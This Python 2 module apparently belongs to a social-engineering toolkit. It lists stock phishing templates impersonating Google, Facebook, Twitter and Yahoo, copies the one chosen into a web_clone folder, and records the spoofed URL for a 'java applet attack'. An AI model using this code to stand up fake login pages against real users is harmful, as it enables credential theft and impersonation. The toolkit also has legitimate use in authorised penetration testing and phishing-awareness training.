#!/usr/bin/env python
import subprocess
import os
import shutil
import glob
from src.core.setcore import *

me = mod_name()
dest = "src/html/"
templateroot = os.path.join(dest,"templates")

debug_msg(me,"entering src.html.templates.template'",1)

#
# used for pre-defined templates
#

templatedata = {}
# data[0] = URL
# data[1] = copy mode.  1 = one file, 2 = all files
templatedata["java"] = ["",1]
templatedata["google"] = ["http://www.google.com",1]
templatedata["facebook"] = ["http://www.facebook.com",2]
templatedata["twitter"] = ["http://www.twitter.com",1]
templatedata["yahoo"] = ["http://mail.yahoo.com",1]

# dynamically get template folder names
templatelist = {}

folderkey = 1
for foldername in os.listdir(templateroot):
    if os.path.isdir(os.path.join(templateroot,foldername)): 
        templatelist[folderkey] = foldername.lower()
        print "  %d. %s" % (folderkey, foldername.title())
        folderkey += 1

choice=raw_input(setprompt(["2"],"Select a template"))

if choice == "exit":
    exit_set()

# file used for nextpage in java applet attack
filewrite=file(setdir + "/site.template", "w")

# if nothing is selected
if choice == "": choice = "1"

selectedtemplateid = int(choice)
if selectedtemplateid in templatelist:
    selectedtemplateloc = templatelist[selectedtemplateid]
    if os.path.isfile("src/html/index.template"): os.remove("src/html/index.template")
    if selectedtemplateloc in templatedata:
        URL = templatedata[selectedtemplateloc][0]
        copymode = templatedata[selectedtemplateloc][1]
    else:
        # no prototype, default to blank URL and single file copy mode
        URL = ""
        copymode = 1
    if copymode == 1:
        shutil.copyfile("src/html/templates/%s/index.template" % selectedtemplateloc, "src/html/index.template")
    elif copymode == 2:
        for files in glob.glob('src/html/templates/%s/*.*' % selectedtemplateloc): shutil.copy(files, "src/html/")
    

if not os.path.isdir(setdir + "/web_clone"):
    os.makedirs(setdir + "/web_clone/")
if os.path.isfile(setdir + "/web_clone/index.html"): os.remove(setdir + "/web_clone/index.html")
shutil.copyfile("src/html/index.template", setdir + "/web_clone/index.html")
filewrite.write("TEMPLATE=SELF" + "\n"+"URL=%s" % (URL))
filewrite.close()

debug_msg(me,"exiting src.html.templates.template'",1)
